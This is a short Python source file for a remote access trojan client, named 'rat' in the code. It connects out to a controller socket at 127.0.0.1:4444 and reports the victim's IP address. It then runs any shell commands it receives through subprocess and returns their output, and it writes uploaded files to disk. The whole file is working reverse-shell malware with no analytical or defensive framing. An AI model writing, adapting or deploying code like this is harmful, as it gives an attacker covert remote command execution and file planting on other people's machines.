#!/usr/bin/env python3

import socket, subprocess, os, platform
import time


class CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        
    def connection(self):
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        information_send = socket.gethostbyname(socket.gethostname())
        sock.send(information_send.encode())
        
    def main_loop(self):
        while True:
            command = sock.recv(1024).decode()   
                
            if command == 'shell':
                while True:
                    command = sock.recv(1024).decode()
                    try:
                        if command == "exit":
                            break
                        elif command[:2] == 'cd':
                            os.chdir(command[3:])
                            directory = os.getcwd()
                            str_dir = str(directory)
                            sock.send(str_dir.encode())
                            command = ''
                        output = subprocess.getoutput(command)
                        sock.send(output.encode())
                    except:
                        err = 'bad command'
                        sock.send(err.encode())
                        
            if command == "upload":
                filename = sock.recv(1024).decode()
                parsed_fn = filename.split('.')
                file = open(f"{parsed_fn[0]}" + '.' + f"{parsed_fn[1]}",'wb') #open in binary       
                #         # receive data and write it to file
                time.sleep(1)
                l = sock.recv(1024)
                print(l)
                file.write(l)
                file.close()

                
rat = CLIENT('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.connection()
    rat.main_loop()
 